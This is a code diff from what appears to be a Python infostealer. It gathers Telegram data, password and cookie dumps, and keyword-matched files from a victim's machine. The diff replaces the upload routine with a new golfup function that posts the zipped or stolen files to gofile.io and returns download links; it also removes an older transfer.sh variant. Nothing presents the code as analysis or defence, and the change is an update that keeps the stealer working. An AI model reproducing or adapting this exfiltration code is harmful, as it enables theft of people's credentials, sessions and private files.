@@ -655,7 +655,7 @@ def ZipTelegram(path, arg, procc):
             zf.write(pathC + "/" + file)
     zf.close()
 
-    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
+    lnik = golfup(f'{pathC}/{name}.zip')
     
     os.remove(f"{pathC}/{name}.zip")
     OtherZip.append([arg, lnik])
@@ -697,7 +697,7 @@ def ZipThings(path, arg, procc):
         if not ".zip" in file: zf.write(pathC + "/" + file)
     zf.close()
 
-    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
+    lnik = golfup(f'{pathC}/{name}.zip')
     
     os.remove(f"{pathC}/{name}.zip")
 
@@ -780,40 +780,26 @@ def GatherAll():
 
     for file in ["wppassw.txt", "wpcook.txt"]: 
         # upload(os.getenv("TEMP") + "\\" + file)
-        upload(file.replace(".txt", ""), uploadToAnonfiles(os.getenv("TEMP") + "\\" + file))
+        upload(file.replace(".txt", ""), golfup(os.getenv("TEMP") + "\\" + file))
 
-def uploadToAnonfiles(path):
-    try:
-        # pegar servidor
-        server_res = requests.get("https://api.gofile.io/getServer").json()
-        server = server_res["data"]["server"]
+def golfup(path):
+      try:
+          with open(path, "rb") as f:
+              upload_res = requests.post(
+                  "https://upload.gofile.io/uploadfile",
+                  files={"file": f}
+              ).json()
 
-        # upload
-        with open(path, "rb") as f:
-            upload_res = requests.post(
-                f"https://{server}.gofile.io/uploadFile",
-                files={"file": f}
-            ).json()
+          if upload_res.get("status") == "ok":
+              data = upload_res.get("data", {})
+              return data.get("downloadPage") or data.get("directLink")
 
-        # validar resposta
-        if upload_res.get("status") == "ok":
-            return upload_res["data"].get("downloadPage") or upload_res["data"].get("downloadUrl")
+          print("Upload failed:", upload_res)
+          return False
 
-        print("Upload failed:", upload_res)
-        return False
-
-    except Exception as e:
-        print("Error:", e)
-        return False
-
-# def uploadToAnonfiles(path):s
-#     try:
-#         files = { "file": (path, open(path, mode='rb')) }
-#         upload = requests.post("https://transfer.sh/", files=files)
-#         url = upload.text
-#         return url
-#     except:
-#         return False
+      except Exception as e:
+          print("Error:", e)
+          return False
 
 def KiwiFolder(pathF, keywords):
     global KiwiFiles
@@ -825,7 +811,7 @@ def KiwiFolder(pathF, keywords):
         if not os.path.isfile(pathF + "/" + file): return
         i += 1
         if i <= maxfilesperdir:
-            url = uploadToAnonfiles(pathF + "/" + file)
+            url = golfup(pathF + "/" + file)
             ffound.append([pathF + "/" + file, url])
         else:
             break
@@ -840,7 +826,7 @@ def KiwiFile(path, keywords):
         for worf in keywords:
             if worf in file.lower():
                 if os.path.isfile(path + "/" + file) and ".txt" in file:
-                    fifound.append([path + "/" + file, uploadToAnonfiles(path + "/" + file)])
+                    fifound.append([path + "/" + file, golfup(path + "/" + file)])
                     break
                 if os.path.isdir(path + "/" + file):
                     target = path + "/" + file
